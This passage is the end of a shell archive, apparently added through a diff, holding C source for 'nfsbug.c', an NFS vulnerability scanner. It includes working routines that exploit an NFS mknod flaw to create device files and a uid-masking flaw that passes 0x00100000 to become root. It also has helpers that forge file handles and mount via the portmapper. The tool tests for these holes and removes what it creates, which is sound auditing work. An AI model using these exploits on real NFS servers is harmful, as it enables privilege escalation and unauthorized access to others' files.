+X    bcopy(handle, &dargs.dir, NFS_FHSIZE);
+X    dres = nfsproc_lookup_2(&dargs, client);
+X    if (!dres || dres->status != NFS_OK)
+X	return FALSE;
+X
+X    /* make sure it is really a valid file handle */
+X    ares = nfsproc_getattr_2(&dres->diropres_u.diropres.file, client);
+X    return ares && ares->status == NFS_OK;
+X}
+X
+X/*
+X * 5. The mknod ... bug. Most NFS implementations allow you to turn
+X *    create into a mknod, without any validation. This allows every
+X *    user to make new devices. It doesn't take a genius to figure
+X *    out what you can do with that.
+X *
+X *    CAVEAT: this code doesn't work if it cannot write the root directory.
+X *    I'm not in the mood today to write code that traverses the tree until
+X *    it finds a writable directory.
+X */
+Xint
+Xmknodbug(handle, client)
+X    fhandle *handle;
+X    CLIENT *client;
+X{
+X    diropargs dargs;
+X    diropres *dres;
+X    attrstat *ares;
+X    createargs cargs;
+X
+X    /*
+X     * Simply try to create a device in the root directory.
+X     * For this we need the root directory's uid and gid.
+X     */
+X    ares = nfsproc_getattr_2(handle, client);
+X    if (!ares || ares->status != NFS_OK)
+X	return FALSE;
+X
+X    /*
+X     * Create character device 0,0
+X     */
+X    memcpy(&cargs.where.dir, handle, sizeof(*handle));
+X    cargs.where.name = VERY_UNLIKELY_FILE_NAME;
+X    cargs.attributes.mode = IFCHR;
+X    cargs.attributes.size = makedev(0, 0);
+X
+X    if (ares->attrstat_u.attributes.uid)
+X	cargs.attributes.uid = ares->attrstat_u.attributes.uid;
+X    else
+X	cargs.attributes.uid = -2;
+X
+X    if (ares->attrstat_u.attributes.gid)
+X	cargs.attributes.gid = ares->attrstat_u.attributes.gid;
+X    else
+X	cargs.attributes.gid = -2;
+X
+X    dres = nfsproc_create_2(&cargs, client);
+X    if (!dres || dres->status != NFS_OK)
+X	return FALSE;
+X
+X    /*
+X     * Apparently it worked, make sure it did ...
+X     */
+X    dargs.name = VERY_UNLIKELY_FILE_NAME;
+X    memcpy(&dargs.dir, handle, sizeof(*handle));
+X    dres = nfsproc_lookup_2(&dargs, client);
+X    if (!dres || dres->status != NFS_OK)
+X	return FALSE;
+X
+X    /* get the file handle for VERY_UNLIKELY_FILE_NAME */
+X    dargs.name = VERY_UNLIKELY_FILE_NAME;
+X    bcopy(handle, &dargs.dir, NFS_FHSIZE);
+X    dres = nfsproc_lookup_2(&dargs, client);
+X    if (!dres || dres->status != NFS_OK)
+X	return FALSE;
+X
+X    /* make sure it is really the device we created */
+X    ares = nfsproc_getattr_2(&dres->diropres_u.diropres.file, client);
+X    if (!ares || ares->status != NFS_OK)
+X	return FALSE;
+X    if ((ares->attrstat_u.attributes.mode & IFMT) != IFCHR)
+X	return FALSE;
+X    if (ares->attrstat_u.attributes.size != makedev(0, 0))
+X	return FALSE;
+X
+X    /* it did, lets delete it */
+X    dargs.name = VERY_UNLIKELY_FILE_NAME;
+X    memcpy(&dargs.dir, handle, sizeof(*handle));
+X    (void) nfsproc_remove_2(&dargs, client);
+X
+X    return TRUE;
+X}
+X
+X/*
+X * 6. The uid bug ... Because of some stupid masking problem with
+X *    uids (i.e. uid is 16 bit, the value passed is 32 bits; the
+X *    root check is performed on the 32 bit value BEFORE masking)
+X *    it very easy to masquarade as root.
+X */
+Xint
+Xuidbug(handle, client)
+X    fhandle *handle;
+X    CLIENT *client;
+X{
+X    diropargs dargs;
+X    diropres *dres;
+X    attrstat *ares;
+X    createargs cargs;
+X    AUTH *auth;
+X    int id;
+X
+X    id = 0x00100000; /* this becomes 0 after masking it */
+X    auth = client->cl_auth;
+X    client->cl_auth = create_unix_auth(id, id);
+X
+X    /*
+X     * Create a zero length file with uid 0, gid 0
+X     */
+X    cargs.where.name = VERY_UNLIKELY_FILE_NAME;
+X    memcpy(&cargs.where.dir, handle, sizeof(*handle));
+X    cargs.attributes.mode = 0666;
+X    cargs.attributes.uid = id;
+X    cargs.attributes.gid = id;
+X    cargs.attributes.size = -1;
+X    cargs.attributes.atime.seconds = -1;
+X    cargs.attributes.atime.useconds = -1;
+X    cargs.attributes.mtime.seconds = -1;
+X    cargs.attributes.mtime.useconds = -1;
+X    dres = nfsproc_create_2(&cargs, client);
+X    if (!dres || dres->status != NFS_OK) {
+X	auth_destroy(client->cl_auth);
+X	client->cl_auth = auth;
+X	return FALSE;
+X    }
+X
+X    /*
+X     * Apparently it worked, make sure it did ...
+X     */
+X    dargs.name = VERY_UNLIKELY_FILE_NAME;
+X    memcpy(&dargs.dir, handle, sizeof(*handle));
+X    dres = nfsproc_lookup_2(&dargs, client);
+X    if (!dres || dres->status != NFS_OK) {
+X	auth_destroy(client->cl_auth);
+X	client->cl_auth = auth;
+X	return FALSE;
+X    }
+X
+X    /* get the file handle for VERY_UNLIKELY_FILE_NAME */
+X    dargs.name = VERY_UNLIKELY_FILE_NAME;
+X    bcopy(handle, &dargs.dir, NFS_FHSIZE);
+X    dres = nfsproc_lookup_2(&dargs, client);
+X    if (!dres || dres->status != NFS_OK)
+X	return FALSE;
+X
+X    /* make sure it is really root owned */
+X    ares = nfsproc_getattr_2(&dres->diropres_u.diropres.file, client);
+X    if (!ares || ares->status != NFS_OK)
+X	return FALSE;
+X    if (ares->attrstat_u.attributes.uid != 0)
+X	return FALSE;
+X    if (ares->attrstat_u.attributes.gid != 0)
+X	return FALSE;
+X
+X    /* it did, lets delete it */
+X    dargs.name = VERY_UNLIKELY_FILE_NAME;
+X    memcpy(&dargs.dir, handle, sizeof(*handle));
+X    (void) nfsproc_remove_2(&dargs, client);
+X
+X    auth_destroy(client->cl_auth);
+X    client->cl_auth = auth;
+X    return TRUE;
+X}
+X
+X/*
+X * Make a mount call via the port mapper
+X */
+Xfhstatus *
+Xpmap_mnt(argp, addr)
+X    dirpath *argp;
+X    struct sockaddr_in *addr;
+X{
+X    enum clnt_stat stat;
+X    static fhstatus res;
+X    u_long port;
+X
+X    bzero((char *)&res, sizeof(res));
+X    if ((stat = pmap_rmtcall(addr, MOUNTPROG, MOUNTVERS, MOUNTPROC_MNT,
+X      xdr_dirpath, argp, xdr_fhstatus, &res, timeout, &port)) != RPC_SUCCESS) {
+X	clnt_perrno(stat);
+X	return NULL;
+X    }
+X    return &res;
+X}
+X
+X/*
+X * Create a handle
+X */
+Xvoid
+Xmakehandle(handle, maj, min, inum, gen, rinum, rgen)
+X    struct svcfh *handle;
+X    int maj, min;
+X    long inum, gen;
+X    long rinum, rgen;
+X{
+X#ifdef	HPUX
+X    handle->fh_fsid[0] = makedev(maj, min);
+X    handle->fh_fsid[1] = MOUNT_UFS;
+X#else
+X    handle->fh_fsid.val[0] = makedev(maj, min);
+X    handle->fh_fsid.val[1] = MOUNT_UFS;
+X#endif
+X
+X    handle->fh_len = 10;
+X    *((u_short *)&handle->fh_data[0]) = 0;	/* length */
+X    *((ino_t *)&handle->fh_data[2]) = inum;	/* inode */
+X    *((long *)&handle->fh_data[6]) = gen;	/* generation number */
+X
+X    handle->fh_xlen = 10;
+X    *((u_short *)&handle->fh_xdata[0]) = 0;	/* length */
+X    *((ino_t *)&handle->fh_xdata[2]) = rinum;	/* inode */
+X    *((long *)&handle->fh_xdata[6]) = rgen;	/* generation number */
+X}
+X
+Xvoid
+Xprinthandle(handle)
+X    struct svcfh *handle;
+X{
+X    register char *p;
+X    register int i;
+X
+X    /* fsid[0] -> major, minor device number */
+X#ifdef	HPUX
+X    printf("(%d,%d) ",
+X	major(handle->fh_fsid[0]), minor(handle->fh_fsid[0]));
+X#else
+X    printf("(%d,%d) ",
+X	major(handle->fh_fsid.val[0]), minor(handle->fh_fsid.val[0]));
+X#endif
+X
+X    /* fsid[1] -> file system type */
+X#ifdef	HPUX
+X    switch (handle->fh_fsid[1]) {
+X#else
+X    switch (handle->fh_fsid.val[1]) {
+X#endif
+X    case MOUNT_UFS: printf("ufs "); break;
+X    case MOUNT_NFS: printf("nfs "); break;
+X    case MOUNT_PC:  printf("pcfs "); break;
+X    case MOUNT_LO:  printf("lofs "); break;
+X    case MOUNT_TFS: printf("tfs "); break;
+X    case MOUNT_TMP: printf("tmp "); break;
+X    default:	    printf("unknown "); break;
+X    }
+X
+X    /* file number length, and data */
+X    printf("<%d,%ld,%ld> ",
+X	*((u_short *)&handle->fh_data[0]),
+X	*((ino_t *)&handle->fh_data[2]),
+X	*((long *)&handle->fh_data[6]));
+X
+X    /* export file number length, and data */
+X    printf("<%d,%ld,%ld> ",
+X	*((u_short *)&handle->fh_xdata[0]),
+X	*((ino_t *)&handle->fh_xdata[2]),
+X	*((long *)&handle->fh_xdata[6]));
+X
+X    /* print handle in hex-decimal format (as input for nfs) */
+X    printf("= <");
+X    for (i = 0, p = (char *)handle; i < sizeof(struct svcfh); i++, p++)
+X	printf(" %02x", *p & 0xFF);
+X    printf(" >\n");
+X}
+X
+X/*
+X * Returns an auth handle with parameters determined by doing lots of
+X * syscalls.
+X */
+XAUTH *
+Xcreate_unix_auth(uid, gid)
+X    int uid, gid;
+X{
+X    char machname[MAX_MACHINE_NAME + 1];
+X    int gids[1];
+X
+X    if (gethostname(machname, MAX_MACHINE_NAME) == -1) {
+X	fprintf(stderr, "create_unix_auth: cannot get hostname\n");
+X	return NULL;
+X    }
+X    machname[MAX_MACHINE_NAME] = 0;
+X    gids[0] = gid;
+X    return authunix_create(machname, uid, gid, 1, gids);
+X}
+X
+X/*
+X * NFS errors
+X */
+Xchar *
+Xnfs_error(stat)
+X    enum nfsstat stat;
+X{
+X    switch (stat) {
+X    case NFS_OK:
+X	return "No error";
+X    case NFSERR_PERM:
+X	return "Not owner";
+X    case NFSERR_NOENT:
+X	return "No such file or directory";
+X    case NFSERR_IO:
+X	return "I/O error";
+X    case NFSERR_NXIO:
+X	return "No such device or address";
+X    case NFSERR_ACCES:
+X	return "Permission denied";
+X    case NFSERR_EXIST:
+X	return "File exists";
+X    case NFSERR_NODEV:
+X	return "No such device";
+X    case NFSERR_NOTDIR:
+X	return "Not a directory";
+X    case NFSERR_ISDIR:
+X	return "Is a directory";
+X    case NFSERR_FBIG:
+X	return "File too large";
+X    case NFSERR_NOSPC:
+X	return "No space left on device";
+X    case NFSERR_ROFS:
+X	return "Read-only file system";
+X    case NFSERR_NAMETOOLONG:
+X	return "File name too long";
+X    case NFSERR_NOTEMPTY:
+X	return "Directory not empty";
+X    case NFSERR_DQUOT:
+X	return "Disc quota exceeded";
+X    case NFSERR_STALE:
+X	return "Stale NFS file handle";
+X    case NFSERR_WFLUSH:
+X	return "Write cache flushed";
+X    default:
+X	return "UKNOWN NFS ERROR";
+X    }
+X}
++ END-OF-FILE nfsbug.c
+chmod 'u=rw,g=r,o=r' 'nfsbug.c'
+set `wc -c 'nfsbug.c'`
+count=$1
+case $count in
+23179)	:;;
+*)	echo 'Bad character count in ''nfsbug.c' >&2
+		echo 'Count should be 23179' >&2
+esac
+exit 0
